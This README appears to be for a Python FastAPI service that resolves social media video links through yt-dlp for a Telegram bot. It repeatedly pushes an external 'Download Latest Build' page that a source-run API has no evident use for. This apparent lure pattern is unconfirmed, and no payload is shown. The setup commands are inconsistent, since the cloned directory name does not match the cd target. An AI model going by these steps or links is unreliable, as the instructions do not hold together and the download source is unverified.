# All Media Downloader API v2026 - media downloader API 2026

> **A FastAPI service for resolving TikTok, Instagram, and Facebook media URLs.** Powered by Python and yt-dlp, it provides direct video URLs, captions, and metadata for the All Media Downloader Telegram bot backend and other client integrations.

[![Platform](https://img.shields.io/badge/Platform-Python%20FastAPI-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bakerevanyg8552/all-media-resolver-api?style=flat-square)](https://github.com/bakerevanyg8552/all-media-resolver-api)

---

<p align="center">
  <a href="https://bakerevanyg8552.github.io/all-media-resolver-api/">
    <img src="https://img.shields.io/badge/Download-All%20Media%20Downloader%20API%20Latest-brightgreen?style=for-the-badge" alt="Download All Media Downloader API">
  </a>
</p>

> **[Download All Media Downloader API v2026](https://bakerevanyg8552.github.io/all-media-resolver-api/)**

---

[Download Latest Build](https://bakerevanyg8552.github.io/all-media-resolver-api/)

---

## Overview

All Media Downloader API offers a FastAPI-powered backend that converts media links from widely used social platforms into structured download information. Instead of requiring clients to process the original page URL, the service can return direct video links, captions, and associated metadata.

The API is intended for integrations that need dedicated handling for TikTok, Instagram, and Facebook. It separates platform routes, can automatically identify download requests, and uses yt-dlp as its main extraction engine. Scraper-based fallbacks are also available when the primary workflow cannot retrieve the media, making the project suitable for Telegram bot backends and other media-processing tools.

---

## Capabilities

- Produces direct video URLs along with captions and metadata
- Handles media links from TikTok, Instagram, and Facebook
- Provides individual routes for supported platforms
- Offers automatic request detection and routing
- Uses yt-dlp as the primary media extraction method
- Switches to scraper extraction as a fallback when necessary
- Preserves complete Instagram captions
- Supports Firebase statistics, application logging, and live system status tracking

---

## Setup

The service runs as a Python FastAPI application. Clone the repository, install its dependencies, and start the ASGI server.

1. Clone the project:
   - `git clone https://github.com/bakerevanyg8552/all-media-resolver-api.git
   - `cd all-media-downloader-api`

2. Install requirements:
   - `pip install -r requirements.txt`

3. Start the API:
   - `uvicorn main:app --reload`

When using a different ASGI entrypoint, replace the module and application name with the values defined by that deployment.

---

## Using the API

Provide a TikTok, Instagram, or Facebook media URL to the relevant route. Requests may also be sent through the automatic detection route when the service can identify the source platform.

A normal integration can follow this sequence:

- Send a supported social media URL
- Use either the matching platform route or automatic detection
- Read the returned direct links, captions, and metadata
- Pass the structured response to a Telegram bot, client application, or internal service

Common request routes include:

- `POST /download`
- `POST /tiktok`
- `POST /instagram`
- `POST /facebook`

Route names can differ between implementations. Confirm the routes exposed by the running application before connecting an external client.

---

## Runtime Configuration

Deployment settings are generally supplied through environment variables and application startup options. Depending on the deployment, configuration may cover:

- Firebase connection information
- Logging and analytics controls
- Host and port values
- Telegram bot backend integration settings
- Status page and metrics configuration

Example environment layout:

    FIREBASE_*=
    HOST=0.0.0.0
    PORT=8000

Consult the repository files to identify the exact environment variable names required by your setup.

---

## Requirements

- A Python runtime suitable for FastAPI applications
- `yt-dlp` installed and available to the service
- Internet connectivity for accessing external media URLs
- An environment that can run an ASGI application
- Optional Firebase access for statistics and logging
- Storage and log access appropriate to the deployment

---

## Frequently Asked Questions

**How can I update the service?**  
Pull the newest repository changes, then reinstall dependencies whenever the backend update requires it.

**Where should configuration be defined?**  
In most deployments, values are supplied through environment variables or startup configuration for the service.

**What should I do when a URL cannot be resolved?**  
First try the route dedicated to the source platform, then test the automatic detection route. Resolution can also be affected when a platform changes its page structure or when current yt-dlp and scraper support has not yet caught up.

**Does the project provide service monitoring?**  
Yes. The project includes a live status page that reports uptime and system metrics.

**Can this API power a bot?**  
Yes. It is built to support the All Media Downloader Telegram bot backend as well as comparable integrations.

---

## License

This project is distributed under the GNU GPL v3.0. Refer to [LICENSE](LICENSE) for the full license text.
